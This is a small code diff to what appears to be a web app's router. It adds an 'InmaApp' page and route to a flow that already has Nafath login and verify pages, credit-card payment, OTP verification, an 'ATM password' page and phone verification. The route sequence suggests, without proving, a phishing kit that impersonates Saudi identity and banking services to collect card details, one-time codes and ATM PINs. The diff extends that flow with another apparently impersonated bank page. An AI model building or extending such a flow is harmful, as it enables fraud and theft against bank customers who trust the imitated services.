@@ -57,6 +57,9 @@ import NafathLoginPage from "./pages/NafathLoginPage";
 import NafathLogin from "./pages/NafathLogin";
 import NafathVerify from "./pages/NafathVerify";
 
+// Inma App
+import InmaApp from "./pages/InmaApp";
+
 // Final Page
 import FinalPage from "./pages/FinalPage";
 
@@ -75,6 +78,7 @@ function Router() {
       {/* Payment Routes */}
       <Route path={"/credit-card-payment"} component={CreditCardPayment} />
       <Route path={"/otp-verification"} component={OTPVerification} />
+      <Route path={"/inma-app"} component={InmaApp} />
       <Route path={"/atm-password"} component={ATMPassword} />
 
       {/* Phone Verification Routes */}
